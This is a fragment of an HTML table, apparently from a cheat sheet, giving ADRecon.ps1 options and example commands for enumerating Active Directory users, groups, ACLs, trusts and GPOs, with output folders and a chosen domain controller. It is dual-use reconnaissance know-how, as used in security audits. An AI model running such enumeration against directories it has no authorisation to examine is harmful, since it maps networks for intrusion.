      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>.\ADRecon.ps1 -CollectionMethod All</code></td>
      <td><code>.\ADRecon.ps1 -CollectionMethod All</code></td>
      <td>Collect users, groups, computers, ACLs, trusts, GPOs.</td>
    </tr>
    <tr>
      <td><code>-OutputFolder</code></td>
      <td><code>.\ADRecon.ps1 -OutputFolder C:\Recon</code></td>
      <td>Define directory for Excel/CSV outputs.</td>
    </tr>
    <tr>
      <td><code>-ExcludeData</code></td>
      <td><code>.\ADRecon.ps1 -ExcludeData Trusts,ACLs</code></td>
      <td>Skip collecting specified data categories.</td>
    </tr>
    <tr>
      <td><code>-Verbose</code></td>
      <td><code>.\ADRecon.ps1 -Verbose</code></td>
      <td>Show detailed progress in console.</td>
    </tr>
    <tr>
      <td><code>-DomainController</code></td>
      <td><code>.\ADRecon.ps1 -DomainController dc1.corp.local</code></td>
      <td>Target a specific DC for data collection.</td>
    </tr>
  </tbody>
</table>